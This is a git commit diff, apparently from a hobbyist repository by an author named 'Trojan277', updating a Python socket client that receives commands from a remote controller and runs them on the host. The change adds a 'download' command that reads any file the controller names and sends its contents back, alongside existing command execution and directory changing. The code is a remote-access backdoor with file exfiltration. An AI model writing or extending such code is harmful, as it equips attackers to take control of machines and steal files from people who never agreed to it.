d1d6fea23bdfc5664b8ecce346fed6014aebfdd6
Trojan277 <70176627+Trojan277@users.noreply.github.com>
2021-01-30 12:30:06 +0300

    Update 36-socket.py

--- 36-socket.py
+++ 36-socket.py
@@ -28,11 +28,14 @@ class Socket:
 				return json.loads(json_data)
 			except ValueError:
 				continue
-				
+
  	def execute_cd_command(self, directory):
  		os.chdir(directory)
  		return 'Cd to ' + directory
 
+ 	def read_file_contents(self, path):
+ 		with open(path,'rb') as my_file:
+ 			return my_file.read()
 
 	def start_socket(self):
 		while True:
@@ -43,6 +46,8 @@ class Socket:
 				exit()
 			elif command[0] == 'cd' and len(command) > 1:
 				command_output = self.execute_cd_command(command[1])
+			elif command[0] == 'download':
+				command_output = self.read_file_contents(command[1])
 			else:
 				command_output = self.command_execution(command)
 
